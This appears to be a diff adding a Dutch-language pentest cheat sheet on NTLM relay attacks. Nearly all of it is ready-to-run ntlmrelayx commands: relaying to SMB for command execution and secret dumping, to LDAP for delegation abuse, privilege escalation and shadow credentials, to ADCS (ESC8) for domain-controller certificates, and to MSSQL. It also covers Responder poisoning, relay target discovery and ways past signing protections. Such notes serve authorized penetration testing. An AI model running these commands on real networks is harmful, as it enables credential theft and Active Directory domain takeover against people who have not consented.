@@ -1,0 +1,47 @@
+# NTLM Relay — Authenticatie doorsturen naar andere services
+# Vang NTLM auth op en relay naar SMB, LDAP, HTTP, MSSQL
+#
+# === Vereisten ===
+# - Coercion of Responder voor NTLM authenticatie capture
+# - SMB signing NIET vereist op doelwit (voor SMB relay)
+# - Of HTTP/LDAP target (geen signing vereist)
+#
+# === Voorbeelden ===
+
+# SMB → SMB relay (command execution)
+python3 ntlmrelayx.py -tf targets.txt -smb2support -c 'whoami'
+
+# SMB → SMB relay (secretsdump)
+python3 ntlmrelayx.py -tf targets.txt -smb2support --dump-secrets
+
+# SMB → LDAP relay (RBCD setup)
+python3 ntlmrelayx.py -t ldaps://DC_IP --delegate-access -smb2support
+
+# SMB → LDAP relay (ACL abuse)
+python3 ntlmrelayx.py -t ldaps://DC_IP --escalate-user ATTACKER_USER -smb2support
+
+# HTTP → LDAP relay (Shadow Credentials)
+python3 ntlmrelayx.py -t ldaps://DC_IP --shadow-credentials -smb2support
+
+# SMB → ADCS relay (ESC8 - certificaat aanvragen)
+python3 ntlmrelayx.py -t http://CA/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
+
+# SMB → MSSQL relay
+python3 ntlmrelayx.py -t mssql://SQL_IP -smb2support -q 'SELECT system_user'
+
+# Multi-relay met socks proxy
+python3 ntlmrelayx.py -tf targets.txt -smb2support -socks
+
+# Targets file genereren (hosts zonder SMB signing)
+crackmapexec smb network/24 --gen-relay-list targets.txt
+
+# Combinatie met Responder
+# Terminal 1:
+python3 Responder.py -I eth0 -dwPv
+# Terminal 2:
+python3 ntlmrelayx.py -tf targets.txt -smb2support
+
+# Noot: SMB signing blokkeert SMB→SMB relay (maar niet SMB→LDAP)
+# Noot: WebDAV coercion omzeilt SMB signing (HTTP authenticatie)
+# Noot: LDAP signing blokkeert relay naar LDAP (gebruik LDAPS dan)
+# Noot: --remove-mic flag kan nodig zijn voor CVE-2019-1040
